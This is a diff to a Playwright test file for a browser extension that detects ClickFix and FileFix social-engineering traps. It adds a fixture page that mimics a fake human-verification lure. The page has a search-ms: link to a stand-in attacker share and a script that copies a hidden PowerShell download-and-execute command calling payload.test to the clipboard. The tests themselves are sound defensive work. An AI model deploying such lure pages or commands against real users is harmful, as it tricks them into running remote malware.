@@ -65,6 +65,32 @@ const FILEFIX = `<!doctype html>
   </script>
 </body></html>`
 
+/**
+ * The FileFix page whose instructions appear with the click. The page above words its
+ * pretext from the start, so the ClickFix warning (SCN-008) is up before anyone clicks;
+ * a person who disputed it is not shown it again on that page (round 2 of the
+ * certification). This one is the FileFix click on its own.
+ */
+const FILEFIX_ON_CLICK = `<!doctype html>
+<html><body>
+  <h1>Your document is ready</h1>
+  <a id="open" href="search-ms:query=invoice&crumb=location:%5C%5Cfiles.attacker.test%5Cshare">Open File Explorer</a>
+  ${SAFETY}
+  <script>
+    document.getElementById('open').addEventListener('click', () => {
+      const steps = document.createElement('p')
+      steps.textContent = 'Verify you are human: press Win + R, then Ctrl + V, then press Enter to complete verification.'
+      document.body.append(steps)
+      const area = document.createElement('textarea')
+      area.value = 'powershell -w hidden -c "iex(irm http://payload.test/a)"'
+      document.body.append(area)
+      area.select()
+      document.execCommand('copy')
+      area.remove()
+    })
+  </script>
+</body></html>`
+
 const headline = (page: import('@playwright/test').Page) => page.locator('okolos-banner [data-role=headline]')
 
 test('SCN-049: a link inside an open shadow root is stopped and named', async ({ context }) => {
@@ -150,15 +176,10 @@ test('SCN-049 with SCN-008: a fake check that opens search-ms: and copies a comm
   context,
   extensionId,
 }) => {
-  await serve(context, FILEFIX)
+  await serve(context, FILEFIX_ON_CLICK)
   const page = await context.newPage()
   await page.goto('https://fixture.test/verify')
-
-  // The wording alone raises the ClickFix warning first (SCN-008); a person who
-  // disputes it and clicks the link is the case that was silenced.
-  await expectBanner(page, context)
-  await page.locator('okolos-banner [data-role=dispute]').click()
-  await page.waitForTimeout(1200)
+  await page.waitForTimeout(600)
   await expect(page.locator('okolos-banner')).toHaveCount(0)
 
   await page.locator('#open').click()
@@ -169,4 +190,25 @@ test('SCN-049 with SCN-008: a fake check that opens search-ms: and copies a comm
   await journal.goto(`chrome-extension://${extensionId}/options.html#journal`)
   const line = await journal.evaluate(() => chrome.i18n.getMessage('logTrapClickfix'))
   await expectJournalLine(journal, line.slice(0, 40))
+})
+
+test('SCN-049 with SCN-008: after "This is wrong" on the ClickFix warning, the FileFix click keeps the link warning', async ({
+  context,
+}) => {
+  await serve(context, FILEFIX)
+  const page = await context.newPage()
+  await page.goto('https://fixture.test/verify')
+
+  // The wording alone raises the ClickFix warning first (SCN-008). Disputed, it does not
+  // come back on this page; the link's click is still stopped and named.
+  await expectBanner(page, context)
+  await page.locator('okolos-banner [data-role=dispute]').click()
+  await page.waitForTimeout(1200)
+  await expect(page.locator('okolos-banner')).toHaveCount(0)
+
+  await page.locator('#open').click()
+  await expect(headline(page)).toContainText('may open a program on your computer', { timeout: SURFACE_MOUNT_MS })
+  await page.waitForTimeout(800)
+  await expect(headline(page)).toContainText('may open a program on your computer')
+  expect(await page.evaluate(() => (window as unknown as { __held: boolean[] }).__held)).toEqual([true])
 })
